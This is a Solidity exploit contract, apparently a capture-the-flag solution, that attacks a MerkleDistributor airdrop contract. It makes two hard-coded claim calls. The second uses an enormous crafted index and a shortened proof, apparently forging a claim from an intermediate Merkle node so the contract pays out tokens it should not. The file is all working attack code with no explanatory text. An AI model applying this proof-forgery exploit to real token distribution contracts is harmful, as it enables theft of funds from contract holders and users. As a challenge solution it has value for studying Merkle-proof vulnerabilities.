// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "../contracts/Setup.sol";

contract Attack {
    MerkleDistributor merkleDistributor;

    constructor(MerkleDistributor _merkleDistributor) {
        merkleDistributor = _merkleDistributor;
    }

    function attack() public {
        uint256 index1 = 8;
        address account1 = 0x249934e4C5b838F920883a9f3ceC255C0aB3f827;
        uint96 amount1 = 2966562950867434987397;

        bytes32[] memory proof1 = new bytes32[](6);
        proof1[0] = 0xe10102068cab128ad732ed1a8f53922f78f0acdca6aa82a072e02a77d343be00;
        proof1[1] = 0xd779d1890bba630ee282997e511c09575fae6af79d88ae89a7a850a3eb2876b3;
        proof1[2] = 0x46b46a28fab615ab202ace89e215576e28ed0ee55f5f6b5e36d7ce9b0d1feda2;
        proof1[3] = 0xabde46c0e277501c050793f072f0759904f6b2b8e94023efb7fc9112f366374a;
        proof1[4] = 0x0e3089bffdef8d325761bd4711d7c59b18553f14d84116aecb9098bba3c0a20c;
        proof1[5] = 0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5;

        uint256 index2 = 95977926008167990775258181520762344592149243674153847852637091833889008632898;
        address account2 = 0xd48451c19959e2D9bD4E620fBE88aA5F6F7eA72A;
        uint96 amount2 = 72033437049132565012603;

        bytes32[] memory proof2 = new bytes32[](5);
        proof2[0] = 0x8920c10a5317ecff2d0de2150d5d18f01cb53a377f4c29a9656785a22a680d1d;
        proof2[1] = 0xc999b0a9763c737361256ccc81801b6f759e725e115e4a10aa07e63d27033fde;
        proof2[2] = 0x842f0da95edb7b8dca299f71c33d4e4ecbb37c2301220f6e17eef76c5f386813;
        proof2[3] = 0x0e3089bffdef8d325761bd4711d7c59b18553f14d84116aecb9098bba3c0a20c;
        proof2[4] = 0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5;

        merkleDistributor.claim(index1, account1, amount1, proof1);
        merkleDistributor.claim(index2, account2, amount2, proof2);
    }
}
